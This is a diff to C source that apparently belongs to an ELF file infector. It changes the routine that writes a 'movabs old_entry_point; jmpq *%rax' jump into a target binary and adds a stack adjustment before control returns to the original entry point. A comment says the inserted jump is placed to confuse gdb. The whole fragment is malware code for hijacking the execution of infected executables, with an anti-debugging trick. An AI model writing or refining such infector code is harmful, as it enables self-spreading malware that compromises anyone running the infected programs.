@@ -108,16 +108,11 @@ static inline void memcpy(long src_addr, long dst_addr, long size) __attribute__
 static inline void memcpy(long src_addr, long dst_addr, long size)
 {
 	long x;
-	for(x = 0; x <= size; x += 4, src_addr += 4, dst_addr += 4)
+	for(x = 0; x < size; x += 8, src_addr += 8, dst_addr += 8)
 	{
 		*((long *)dst_addr) = *((long *)src_addr);
 	}
 }
-
-union addr {
-	long addr;
-	unsigned char b[8];
-};
 
 void _start(void) __attribute__((aligned(16)));
 void _start(void)
@@ -174,6 +169,7 @@ label1: ;
 
 			/* change code */
 			/* movabs old_entry_point, %rax
+			 * add $0x2f8, %rsp
 			 * jmpq *%rax
 			 */
 			jmp[0] = '\x48';
@@ -194,15 +190,7 @@ label1: ;
 			 * so I use this space to add jump...
 			 * as a side effect it generates jump inside
 			 * instruction so it mess gdb :) */
-			union addr c = { .addr = ehdr.e_entry };
-			jmp[2] = c.b[0];
-			jmp[3] = c.b[1];
-			jmp[4] = c.b[2];
-			jmp[5] = c.b[3];
-			jmp[6] = c.b[4];
-			jmp[7] = c.b[5];
-			jmp[8] = c.b[6];
-			jmp[9] = c.b[7];
+			memcpy((long)&(ehdr.e_entry), (long)&(jmp[2]), 8); 
 			lseek(fd, 7, SEEK_CUR);
 			write(fd, jmp, sizeof(jmp));
 
